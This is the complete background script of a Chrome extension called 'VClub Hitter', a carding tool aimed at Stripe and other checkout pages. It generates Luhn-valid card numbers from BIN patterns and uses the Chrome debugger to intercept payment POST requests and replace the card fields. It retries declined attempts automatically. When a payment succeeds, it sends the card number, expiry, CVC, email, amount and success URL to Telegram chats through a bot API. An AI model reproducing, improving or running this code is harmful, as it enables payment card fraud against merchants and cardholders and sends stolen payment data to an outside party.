// VCLUB HITTER Background Script
const CONFIG = {
  BOT_TOKEN: '',
  DEBUGGER_VERSION: '1.3',
  RETRY_DELAY: 7000,
  DEFAULT_CHAT_ID: '',
  HIT_SENDER_CHAT_ID: ''
};

// State management
const state = {
  bin: '',
  email: '',
  userClickedSubmit: false,
  retryInProgress: false,
  debuggerAttachedTabs: new Set(),
  tabCardDetailsMap: new Map(),
  tabSuccessUrlMap: new Map(),
  tabEmailMap: new Map(),
  tabAmountMap: new Map(),
  requestIdMap: new Map(),
  tabRetryCountMap: new Map(),
  tabSuccessCountMap: new Map(),
  tabTotalAttemptsMap: new Map(),
  globalSuccessCount: 0,
  globalTotalAttempts: 0,
  tabCardAttemptsMap: new Map()
};

// Initialize state from storage
chrome.storage.local.get([
  "bin", "email", "globalSuccessCount", "globalTotalAttempts"
], (result) => {
  if (result.bin) state.bin = result.bin;
  if (result.email) state.email = result.email;
  if (result.globalSuccessCount) state.globalSuccessCount = result.globalSuccessCount;
  if (result.globalTotalAttempts) state.globalTotalAttempts = result.globalTotalAttempts;
});

// Storage change listener
chrome.storage.onChanged.addListener((changes) => {
  if (changes.bin) state.bin = changes.bin.newValue;
  if (changes.email) state.email = changes.email.newValue;
});

// === LUHN ALGORITHM ===
function luhnAlgorithm(number) {
    let total = 0;
    const reverseDigits = number.toString().split('').reverse();

    reverseDigits.forEach((digit, i) => {
        let n = parseInt(digit, 10);
        if (i % 2 === 1) {
            n *= 2;
            if (n > 9) n -= 9;
        }
        total += n;
    });

    return total % 10 === 0;
}

function completeLuhn(base) {
    for (let d = 0; d <= 9; d++) {
        const candidate = base + d;
        if (luhnAlgorithm(candidate)) return candidate;
    }
    return null;
}

function getCardLength(bin) {
    const firstDigit = bin.charAt(0);
    const firstTwo = bin.substring(0, 2);
    const firstThree = bin.substring(0, 3);
    const firstFour = bin.substring(0, 4);
    
    if (firstTwo === '34' || firstTwo === '37') return 15;
    if (firstTwo === '36' || firstTwo === '38' || 
        (firstThree >= '300' && firstThree <= '305')) return 14;
    if (firstDigit === '4') return 16;
    if ((firstTwo >= '51' && firstTwo <= '55') || 
        (firstFour >= '2221' && firstFour <= '2720')) return 16;
    if (firstFour === '6011' || 
        (firstThree >= '644' && firstThree <= '649') ||
        firstTwo === '65') return 16;
    if (firstTwo === '35') return 16;
    
    return 16;
}

function getCVVLength(cardNumber) {
    const cardLength = cardNumber.length;
    if (cardLength === 15) return 4;
    return 3;
}

// === RANDOM UTILITIES ===
function randomDigit() {
    return Math.floor(Math.random() * 10).toString();
}

// === CARD GENERATOR ===
async function generateCard(cc_bin) {
    const now = new Date();
    const cleanBin = cc_bin.replace(/[^0-9x]/gi, '').replace(/x/gi, '0');
    const cardLength = getCardLength(cleanBin);
    
    let attempts = 0;
    const maxAttempts = 20;

    while (attempts < maxAttempts) {
        attempts++;

        let base = '';
        for (const c of cc_bin) {
            if (c.toLowerCase() === 'x') {
                base += randomDigit();
            } else if (c.match(/[0-9]/)) {
                base += c;
            }
        }
        
        while (base.length < cardLength - 1) {
            base += randomDigit();
        }
        
        base = base.substring(0, cardLength - 1);
        const cardNumber = completeLuhn(base);
        if (!cardNumber) continue;

        if (cardNumber.length !== cardLength) continue;

        const month = Math.floor(Math.random() * 12) + 1;
        const mesStr = month.toString().padStart(2, '0');
        const currentYear = now.getFullYear();
        const year = currentYear + Math.floor(Math.random() * 6) + 1;
        const anoStr = year.toString();
        const cvvLength = getCVVLength(cardNumber);
        const cvvStr = Array.from({ length: cvvLength }, () => randomDigit()).join('');

        return {
            number: cardNumber,
            month: mesStr,
            year: anoStr,
            cvv: cvvStr
        };
    }
    
    throw new Error('Failed to generate valid card after ' + maxAttempts + ' attempts');
}

// Card handling with enhanced format support
async function getCardForTab(tabId) {
  if (state.bin) {
    if (state.bin.includes('|')) {
      const parts = state.bin.split('|');
      if (parts.length === 4) {
        const [number, month, year, cvv] = parts;
        const processedCard = processCardWithPlaceholders(number, month, year, cvv);
        return processedCard;
      }
    }
    
    try {
      const card = await generateCard(state.bin);
      if (card) {
        return card;
      }
    } catch (error) {
      console.error('Card generation error:', error);
    }
  }
  return null;
}

// Process card with xx placeholders
function processCardWithPlaceholders(number, month, year, cvv) {
  let processedNumber = number;
  if (number.includes('x')) {
    processedNumber = generateCardFromPattern(number);
  } else if (number.length < 13) {
    processedNumber = generateCardFromBINPattern(number);
  }
  
  let processedMonth = month;
  if (month === 'xx' || month.includes('x')) {
    processedMonth = generateRandomNumber(1, 12).toString().padStart(2, '0');
  } else if (month.length === 1) {
    processedMonth = month.padStart(2, '0');
  }
  
  let processedYear = year;
  if (year === 'xx' || year.includes('x')) {
    const currentYear = new Date().getFullYear();
    processedYear = generateRandomNumber(currentYear + 1, currentYear + 6).toString();
  } else if (year.length === 2) {
    processedYear = '20' + year;
  }
  
  let processedCvv = cvv;
  const cvvLength = getCVVLength(processedNumber);
  
  if (cvv === 'xx' || cvv === 'xxx' || cvv.includes('x')) {
    processedCvv = Array.from({ length: cvvLength }, () => randomDigit()).join('');
  } else if (cvv.length < cvvLength) {
    processedCvv = cvv.padEnd(cvvLength, '0');
  } else if (cvv.length > cvvLength) {
    processedCvv = cvv.substring(0, cvvLength);
  }
  
  return {
    number: processedNumber,
    month: processedMonth,
    year: processedYear,
    cvv: processedCvv
  };
}

// Generate card number from pattern
function generateCardFromPattern(pattern) {
  const cleanPattern = pattern.replace(/[^0-9x]/gi, '');
  const cardLength = getCardLength(cleanPattern.replace(/x/gi, '0'));
  
  let result = '';
  for (let i = 0; i < cleanPattern.length && result.length < cardLength - 1; i++) {
    if (cleanPattern[i] === 'x') {
      result += randomDigit();
    } else {
      result += cleanPattern[i];
    }
  }
  
  while (result.length < cardLength - 1) {
    result += randomDigit();
  }
  
  const cardNumber = completeLuhn(result);
  return cardNumber || result + '0';
}

// Generate card from BIN pattern
function generateCardFromBINPattern(binPattern) {
  const cleanPattern = binPattern.replace(/[^0-9x]/gi, '');
  const cardLength = getCardLength(cleanPattern.replace(/x/gi, '0'));
  
  let cardNumber = '';
  for (let i = 0; i < cleanPattern.length && cardNumber.length < cardLength - 1; i++) {
    if (cleanPattern[i] === 'x') {
      cardNumber += randomDigit();
    } else {
      cardNumber += cleanPattern[i];
    }
  }
  
  while (cardNumber.length < cardLength - 1) {
    cardNumber += randomDigit();
  }
  
  const finalCard = completeLuhn(cardNumber);
  return finalCard || cardNumber + '0';
}

// Generate random number in range
function generateRandomNumber(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

// Send detailed message to Telegram - FOR DEFAULT CHAT ID (FULL DETAILS)
async function sendDetailedToTelegram(cardDetails, successUrl, amount, tabId) {
  try {
    const email = cardDetails.email || state.tabEmailMap.get(tabId) || "N/A";
    const now = new Date();
    const date = now.toLocaleDateString();
    const time = now.toLocaleTimeString();
    const retryCount = state.tabRetryCountMap.get(tabId) || 0;
    const totalAttempts = state.tabTotalAttemptsMap.get(tabId) || 0;

    const detailedMessage = `
✅ HIT DETECTED
━━━━━━━━━━━━━━━━━━━━
💳 Card: ${cardDetails.number}|${cardDetails.month}|${cardDetails.year}|${cardDetails.cvv}
📧 Email: ${email}
💰 Amount: $${amount || "0"}
🔄 Retry Count: ${retryCount}
━━━━━━━━━━━━━━━━━━━━
📅 Date: ${date}
⏰ Time: ${time}
━━━━━━━━━━━━━━━━━━━━
🔗 Successful Url: <a href="${successUrl}">Success URL</a> 🎉
━━━━━━━━━━━━━━━━━━━━
🚀 Status: ✅ Payment Successful
📊 Total Attempts: ${totalAttempts}
━━━━━━━━━━━━━━━━━━━━
🔋 Powered By: VClub-Tech
`;

    // Send to default chat (FULL DETAILS)
    await sendTelegramMessage(CONFIG.DEFAULT_CHAT_ID, detailedMessage);
    
  } catch (error) {
    console.error('Error sending detailed message:', error);
  }
}

// Send hit message to hit sender - SIMPLE FORMAT FOR GROUP ID
async function sendHitToTelegram(cardDetails, successUrl, amount, tabId) {
  try {
    const email = cardDetails.email || state.tabEmailMap.get(tabId) || "N/A";

    const hitMessage = `
┏━━━━━━━⍟
┃ ✅ PAID $${amount || "0"}
┗━━━━━━━━━━━⊛

📧 EMAIL ➜ ${email}
🔗 Successful Url: <a href="${successUrl}">Success URL</a> 🎉

🔋 Powered By ➜ VClub-Tech
`;

    // Send to hit sender chat (SIMPLE FORMAT)
    await sendTelegramMessage(CONFIG.HIT_SENDER_CHAT_ID, hitMessage);
    
  } catch (error) {
    console.error('Error sending hit message:', error);
  }
}

// Universal Telegram message sender
async function sendTelegramMessage(chatId, message) {
  if (!chatId) return false;
  
  try {
    const url = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`;
    const params = new URLSearchParams({ 
      chat_id: chatId, 
      text: message,
      parse_mode: 'HTML'
    });
    
    const response = await fetch(`${url}?${params}`);
    return response.ok;
    
  } catch (error) {
    console.error('Telegram send error:', error);
    return false;
  }
}

// Tab management
function handleTabUpdate(tabId, changeInfo, tab) {
  if (!tab.url) return;

  const isTargetUrl = tab.url.includes('cs_live') || 
                      tab.url.includes('stripe.com') || 
                      tab.url.includes('checkout.') || 
                      tab.url.includes('billing.') || 
                      tab.url.includes('invoice.') || 
                      tab.url.includes('payment.') || 
                      tab.url.includes('pay.') || 
                      tab.url.includes('secure.');
  if (isTargetUrl) {
    setupTab(tabId);
  }

  if (changeInfo.status === "complete") {
    const successUrl = state.tabSuccessUrlMap.get(tabId);
    if (successUrl && tab.url.startsWith(successUrl)) {
      setTimeout(() => {
        handleSuccess(tabId, tab.url);
      }, 2000);
    }
  }
}

function handleTabActivation({ tabId }) {
  chrome.tabs.get(tabId).then(tab => {
    if (!tab.url) return;

    const isTargetUrl = tab.url.includes('cs_live') || 
                        tab.url.includes('stripe.com') || 
                        tab.url.includes('checkout.') || 
                        tab.url.includes('billing.') || 
                        tab.url.includes('invoice.') || 
                        tab.url.includes('payment.') || 
                        tab.url.includes('pay.') || 
                        tab.url.includes('secure.');
    if (isTargetUrl) {
      setupTab(tabId);
    }

    const successUrl = state.tabSuccessUrlMap.get(tabId);
    if (successUrl && tab.url.startsWith(successUrl)) {
      setTimeout(() => {
        handleSuccess(tabId, tab.url);
      }, 2000);
    }
  });
}

function setupTab(tabId) {
  injectContentScript(tabId);
  if (!state.debuggerAttachedTabs.has(tabId)) {
    attachDebugger(tabId);
  }
}

// Content script injection - SIMPLIFIED
function injectContentScript(tabId) {
  try {
    chrome.scripting.executeScript({
      target: { tabId: tabId },
      files: ['content.js']
    });
  } catch (error) {
    console.log('Script injection may require page reload');
  }
}

// Debugger handling
function attachDebugger(tabId) {
  if (state.debuggerAttachedTabs.has(tabId)) return;

  chrome.tabs.get(tabId, (tab) => {
    if (chrome.runtime.lastError || !tab || !tab.url) {
      return;
    }

    chrome.debugger.attach({ tabId }, CONFIG.DEBUGGER_VERSION, () => {
      if (chrome.runtime.lastError) {
        return;
      }

      state.debuggerAttachedTabs.add(tabId);
      chrome.debugger.sendCommand({ tabId }, "Fetch.enable", { patterns: [{ urlPattern: '*' }] });
      chrome.debugger.sendCommand({ tabId }, "Network.enable");
    });
  });
}

async function handleDebuggerEvent(source, method, params) {
  if (!source.tabId || !state.debuggerAttachedTabs.has(source.tabId)) return;

  const handlers = {
    'Fetch.requestPaused': () => handleRequestPaused(source.tabId, params),
    'Network.responseReceived': () => handleResponseReceived(source.tabId, params),
    'Fetch.authRequired': () => handleAuthRequired(source.tabId, params)
  };

  const handler = handlers[method];
  if (handler) await handler();
}

async function handleRequestPaused(tabId, params) {
  const { requestId, request } = params;
  if (params.networkId) {
    state.requestIdMap.set(requestId, params.networkId);
  }

  if (request.url.includes('stripe.com') && 
      request.method === "POST" && 
      request.postData) {

    const card = await getCardForTab(tabId);
    if (card) {
      const postData = new URLSearchParams(request.postData);

      let email = "N/A";
      if (postData.has('email')) {
        email = postData.get('email');
      } else if (postData.has('card[email]')) {
        email = postData.get('card[email]');
      } else if (postData.has('billing_details[email]')) {
        email = postData.get('billing_details[email]');
      }
      
      state.tabEmailMap.set(tabId, email);
      card.email = email;

      if (postData.has('card[number]')) {
        postData.set("card[number]", card.number);
        postData.set("card[exp_month]", card.month);
        postData.set("card[exp_year]", card.year);
        postData.set('card[cvc]', card.cvv);
      } else {
        chrome.debugger.sendCommand({ tabId }, "Fetch.continueRequest", { requestId });
        return;
      }

      const updatedPostData = postData.toString();
      const headers = {
        ...request.headers,
        "Content-Length": updatedPostData.length.toString(),
        "Content-Type": "application/x-www-form-urlencoded"
      };

      const headersArray = Object.entries(headers).map(([name, value]) => ({ name, value: value.toString() }));
      const encodedPostData = btoa(unescape(encodeURIComponent(updatedPostData)));

      chrome.debugger.sendCommand({ tabId }, "Fetch.continueRequest", {
        requestId,
        method: request.method,
        postData: encodedPostData,
        headers: headersArray
      });

      state.tabCardDetailsMap.set(tabId, card);
      
      const currentCardAttempts = state.tabCardAttemptsMap.get(card.number) || 0;
      state.tabCardAttemptsMap.set(card.number, currentCardAttempts + 1);
      
      const currentRetryCount = state.tabRetryCountMap.get(tabId) || 0;
      state.tabRetryCountMap.set(tabId, currentRetryCount + 1);
      
      const currentTotalAttempts = state.tabTotalAttemptsMap.get(tabId) || 0;
      state.tabTotalAttemptsMap.set(tabId, currentTotalAttempts + 1);
      state.globalTotalAttempts++;
      
      chrome.storage.local.set({
        globalTotalAttempts: state.globalTotalAttempts
      });
      
      chrome.tabs.sendMessage(tabId, {
        type: 'card_injected',
        card: card,
        retryCount: currentCardAttempts + 1,
        totalAttempts: currentTotalAttempts + 1,
        cardAttempts: currentCardAttempts + 1
      });
      
      proceedToRetry(tabId);
    } else {
      chrome.debugger.sendCommand({ tabId }, "Fetch.continueRequest", { requestId });
    }
  } else {
    chrome.debugger.sendCommand({ tabId }, "Fetch.continueRequest", { requestId });
  }
}

async function handleResponseReceived(tabId, params) {
  const { requestId, response } = params;
  if (!response.url.includes("stripe.com")) return;

  const contentType = response.headers['content-type'] || response.headers['Content-Type'] || '';
  if (!contentType.includes("application/json")) return;

  chrome.debugger.sendCommand({ tabId }, "Network.getResponseBody", { requestId }, (response) => {
    if (chrome.runtime.lastError || !response?.body) {
      return;
    }

    try {
      const json = JSON.parse(response.base64Encoded ? atob(response.body) : response.body);
      
      if (json.success_url) {
        state.tabSuccessUrlMap.set(tabId, json.success_url);
      }

      let amount = "N/A";
      if (json.amount) {
        amount = (json.amount / 100).toFixed(2);
      } else if (json.payment_intent?.amount) {
        amount = (json.payment_intent.amount / 100).toFixed(2);
      } else if (json.amount_received) {
        amount = (json.amount_received / 100).toFixed(2);
      } else if (json.amount_capturable) {
        amount = (json.amount_capturable / 100).toFixed(2);
      }
      
      state.tabAmountMap.set(tabId, amount);

      const isPaymentSuccess = json.status?.toLowerCase() === 'succeeded' || 
                               json.status?.toLowerCase() === 'success' || 
                               json.payment_intent?.status?.toLowerCase() === 'succeeded' || 
                               json.payment_intent?.status?.toLowerCase() === 'success';

      if (isPaymentSuccess) {
        handleSuccess(tabId, state.tabSuccessUrlMap.get(tabId) || "N/A");
        return;
      }

      if (json.error || (json.payment_intent?.last_payment_error)) {
        const error = json.error || json.payment_intent.last_payment_error;
        const declineCode = error.decline_code || error.code || "Unknown error code";
        const errorMessage = error.message || "An error occurred during the transaction.";
        
        const cardDetails = state.tabCardDetailsMap.get(tabId);
        const cardAttempts = cardDetails ? state.tabCardAttemptsMap.get(cardDetails.number) || 0 : 0;
        
        chrome.tabs.sendMessage(tabId, {
          type: 'payment_response',
          response: {
            success: false,
            message: errorMessage,
            code: declineCode
          },
          retryCount: state.tabRetryCountMap.get(tabId) || 0,
          totalAttempts: state.tabTotalAttemptsMap.get(tabId) || 0,
          cardAttempts: cardAttempts
        });
      }

    } catch (error) {
      console.log('Response parsing issue - may not be JSON');
    }

    proceedToRetry(tabId);
  });
}

function handleSuccess(tabId, successUrl) {
  const cardDetails = state.tabCardDetailsMap.get(tabId);
  const amount = state.tabAmountMap.get(tabId) || "N/A";
  
  if (cardDetails) {
    const currentSuccessCount = state.tabSuccessCountMap.get(tabId) || 0;
    state.tabSuccessCountMap.set(tabId, currentSuccessCount + 1);
    state.globalSuccessCount++;
    
    chrome.storage.local.set({
      globalSuccessCount: state.globalSuccessCount
    });
    
    chrome.tabs.sendMessage(tabId, {
      type: 'payment_response',
      response: {
        success: true,
        message: `Payment Successful!`
      }
    });
    
    // Send detailed message to DEFAULT_CHAT_ID
    sendDetailedToTelegram(cardDetails, successUrl, amount, tabId);
    // Send simple message to HIT_SENDER_CHAT_ID
    sendHitToTelegram(cardDetails, successUrl, amount, tabId);
    
    state.tabCardDetailsMap.delete(tabId);
    state.tabEmailMap.delete(tabId);
    state.tabAmountMap.delete(tabId);
    state.tabRetryCountMap.delete(tabId);
    state.tabSuccessCountMap.delete(tabId);
    state.tabTotalAttemptsMap.delete(tabId);
    state.tabSuccessUrlMap.delete(tabId);
    if (cardDetails) {
      state.tabCardAttemptsMap.delete(cardDetails.number);
    }
  }
}

function proceedToRetry(tabId) {
  if (state.userClickedSubmit && !state.retryInProgress) {
    state.retryInProgress = true;
    setTimeout(() => {
      chrome.tabs.sendMessage(tabId, {
        type: "trigger_retry"
      }).finally(() => {
        state.retryInProgress = false;
      });
    }, CONFIG.RETRY_DELAY);
  }
}

function handleAuthRequired(tabId, params) {
  chrome.debugger.sendCommand({ tabId }, "Fetch.continueWithAuth", {
    requestId: params.requestId,
    authChallengeResponse: { response: 'Default' }
  });
}

// Cleanup
function handleTabRemoval(tabId) {
  if (state.debuggerAttachedTabs.has(tabId)) {
    chrome.debugger.detach({ tabId }, () => {
      state.debuggerAttachedTabs.delete(tabId);
      state.tabCardDetailsMap.delete(tabId);
      state.tabSuccessUrlMap.delete(tabId);
      state.tabEmailMap.delete(tabId);
      state.tabAmountMap.delete(tabId);
      state.tabRetryCountMap.delete(tabId);
      state.tabSuccessCountMap.delete(tabId);
      state.tabTotalAttemptsMap.delete(tabId);
      
      const cardDetails = state.tabCardDetailsMap.get(tabId);
      if (cardDetails) {
        state.tabCardAttemptsMap.delete(cardDetails.number);
      }
    });
  }
}

// Event listeners
chrome.runtime.onMessage.addListener((message) => {
  if (message.type === 'user_clicked_submit') {
    state.userClickedSubmit = true;
  }
});

chrome.tabs.onUpdated.addListener(handleTabUpdate);
chrome.tabs.onActivated.addListener(handleTabActivation);
chrome.tabs.onRemoved.addListener(handleTabRemoval);
chrome.debugger.onEvent.addListener(handleDebuggerEvent);

// Initialize when extension loads
chrome.runtime.onStartup.addListener(() => {
  console.log('VClub Hitter Extension Started');
});

chrome.runtime.onInstalled.addListener(() => {
  console.log('VClub Hitter Extension Installed');
});